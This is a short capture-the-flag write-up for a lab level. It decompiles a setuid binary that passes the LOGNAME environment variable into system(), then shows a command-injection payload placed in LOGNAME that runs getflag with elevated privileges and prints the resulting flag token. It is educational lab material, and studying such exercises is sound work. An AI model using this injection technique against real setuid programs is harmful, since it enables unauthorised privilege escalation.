with a `ls -la` we can find one file:
    -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

level07 is a not stripped ELF 32-bit LSB executable

we use `scp -P 4242 level07@<ip>:/home/user/level07/level07 ./level07_bin` to download the executable and use `https://dogbolt.org/` to decompile the code.
With a bit of cleaning we get this code:
```c
int main(int argc, const char **argv, const char **envp)
{
  __gid_t gid = getegid();
  __uid_t uid = geteuid();
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  char *v5 = NULL;
  char *v3 = getenv("LOGNAME");
  asprintf(&v5, "/bin/echo %s ", v3);
  return system(v5);
}
```

This `asprintf()` create a string with `v3` equal to the LOGNAME value in env and execute it with `system()`
We can write a simple exploit to run multiple command here to inject the payload in the LOGNAME env variable:
`export LOGNAME=this_was_easy\;getflag\>/tmp/flag`

Run it:
`./level07`

And use `cat /tmp/flag` to get the flag:
`Check flag.Here is your token : fiumuikeil55xe9cu4dood66h`